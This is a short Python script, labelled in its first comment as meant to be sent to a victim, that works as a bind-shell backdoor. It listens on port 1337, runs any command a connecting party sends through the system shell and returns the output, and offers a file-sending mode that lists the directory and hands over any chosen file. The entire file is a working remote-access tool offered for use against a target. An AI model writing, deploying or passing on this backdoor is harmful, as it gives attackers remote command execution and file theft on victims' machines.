# This file is meant to be sent to the victim

import socket
import os


server_socket = socket.socket() # Socket creation
try:
    try:
        server_socket.bind(('0.0.0.0', 1337))
    except Exception as e:
        print(e)
        server_socket.close()
    server_socket.listen()
    print("Server is listening")
    (client_socket, client_address) = server_socket.accept()
    print("Client" + str(client_address) + " connected.")
    command = client_socket.recv(1024).decode()
    print("Command " + command + " Received")
    while command != 'exit': # Adding option to exit
        if command == 'send file': # Adding file sending option
            client_socket.send("Please choose file from current directory:".encode())
            client_socket.send(os.popen('ls').read().encode())
            response = client_socket.recv(1024).decode()
            print('Client answer received: ' + str(response))
            try:
                if str(response) in os.popen('ls').read(): # Sending the file and verifying it exists
                    print(os.popen('ls').read())
                    file = open(str(response), 'rb')
                    data = file.read()
                    client_socket.sendall(data)
                    print("Sending file: " + response)
                    client_socket.send("<END>".encode()) # END tag for the end to alert the end of the file
                    print("Finished sending file")
                    file.close()
                else:
                    client_socket.send("File not found".encode()) # In case file is not in directory
                    print("sending file not found")

                command = client_socket.recv(1024).decode()
                print("command " + command + " received")
            except Exception as e: # Error handling
                print(e)
                client_socket.close()
                server_socket.close()
        else:
            result = os.system(command)
            if result == 0: # Receiving the command and inputting it to the system CLI
                command_output = os.popen(command).read()
                client_socket.send(command_output.encode())
                command = client_socket.recv(1024).decode()
                print("command " + command + " received")
            else:
                client_socket.send("error".encode()) # If the command is not recognizable, send 'error'
                command = client_socket.recv(1024).decode()
                print("command " + command + " received")
except:
    server_socket.close()